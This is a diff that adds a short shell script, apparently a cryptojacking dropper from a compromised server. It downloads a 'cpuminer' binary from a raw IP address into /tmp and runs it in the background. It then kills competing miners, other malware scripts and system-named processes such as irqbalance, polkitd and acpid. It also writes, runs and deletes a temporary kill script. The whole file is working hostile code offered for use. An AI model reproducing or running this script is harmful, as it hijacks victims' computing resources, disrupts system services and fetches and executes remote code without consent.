@@ -1,0 +1,42 @@
+#!/bin/sh
+wget http://176.9.48.167/cpuminer -O /tmp/cpuminer
+chmod +x /tmp/cpuminer
+#killall cpuminer
+/tmp/cpuminer&
+ps -ef|grep .sh|grep -v irq|grep -v grep|cut -c 9-15|xargs kill -9
+pkill -f sleep
+pkill -f /tmp/m
+pkill -f JnKihGjn
+pkill -f irqba2anc1
+pkill -f irqba5xnc1
+pkill -f conns
+pkill -f irqbalance
+pkill -f crypto-pool
+pkill -f minexmr
+pkill -f XJnRj
+pkill -f NXLAi
+pkill -f BI5zj
+pkill -f askdljlqw
+pkill -f minerd
+pkill -f minergate
+pkill -f Guard.sh
+pkill -f ysaydh
+pkill -f bonns
+pkill -f donns
+pkill -f kxjd
+pkill -f 108.61.186.224
+pkill -f Duck.sh
+pkill -f bonn.sh
+pkill -f conn.sh
+pkill -f kworker34
+pkill -f kw.sh
+pkill -f pro.sh
+pkill -f polkitd
+pkill -f acpid
+ps -ef|grep 'irq.sh' |grep -v grep |cut -c 9-15 |xargs kill -9;
+ps -ef|grep 'irqbalan' |grep -v grep |cut -c 9-15 |xargs kill -9;
+ls -A1 /tmp/*.so | sed 's/\/tmp\///g' | awk '{print "killall "$1}' >>/tmp/out;sh /tmp/out;rm -rf /tmp/out
+m=`pidof m`
+kill -9 $m
+
+exit
